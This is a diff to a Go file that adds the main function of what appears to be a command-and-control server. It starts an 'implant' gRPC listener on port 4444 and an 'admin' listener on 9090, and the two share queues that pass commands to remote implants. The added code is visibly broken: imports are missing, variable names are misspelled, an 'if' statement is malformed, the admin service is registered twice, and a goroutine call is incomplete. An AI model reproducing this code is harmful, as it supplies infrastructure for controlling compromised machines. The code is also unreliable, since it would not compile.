@@ -1,5 +1,40 @@
 package server
 
+import (
+  "net/http"
+  "fmt"
+)
+
+func main() {
+  var (
+    implantListener net.Listener
+    adminListener   net.Listener
+    err             error
+    opts            []grpc.ServerOption
+    work, output    chan *grpcapi.Command    
+  )
+  work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+  implant := NewImplantServer(work, output)
+  admin := NewAdminServer(work, output)
+  
+  implantListerner, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444))
+  err != nil {
+    log.Fatal(err)
+  }
+  adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090))
+  if err ! = nil {
+    log.Fatal(err)
+  }
+  
+  gprcAdminServer, grpcImplant := grpc.NewServer(opts...), grpc.NewServer(opts...)
+  grpcapi.RegisterAdminServer(grpcAdminServer, implant)
+  grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+  go func() {
+    grpcImplantServer.Serve(implantListener)
+  }
+  grpcAdminServer.Serve(adminListerner)
+}
+
 type implantServer struct {    
   work, output chan *grpcapi.Command
 }
@@ -22,8 +57,8 @@ func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
   return s
 }
 
-func (s *implantServer) FetchCommand(ctx context.Context, \empty *grpcapi.Empty) (*grpcapi.Command, error) {    
-  var cmd = new(grpcapi.Command)x 
+func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {    
+  var cmd = new(grpcapi.Command)
   select {    
   case cmd, ok := <-s.work:        
     if ok {            
